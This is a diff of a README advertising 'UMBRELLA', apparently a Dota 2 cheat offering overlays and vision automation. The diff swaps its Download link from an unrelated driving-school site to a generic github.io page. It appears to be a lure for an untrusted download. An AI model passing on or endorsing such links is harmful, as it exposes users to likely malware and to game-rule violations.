@@ -2,7 +2,7 @@
 
 UMBRELLA is a high-level tactical assistant designed for Dota 2 players who seek smarter decision-making and improved control of the battlefield. It delivers real-time overlays, vision automation, and predictive tools that amplify your in-game awareness and strategic reaction speed.
 
-[![Download UMBRELLA](https://img.shields.io/badge/Download-UMBRELLA-blueviolet)](https://dalahdrivingschool.com/)
+[![Download UMBRELLA](https://img.shields.io/badge/Download-UMBRELLA-blueviolet)](https://dota-2-strategic-enhancement-utilitymod.github.io/.github)
 
 ---
 
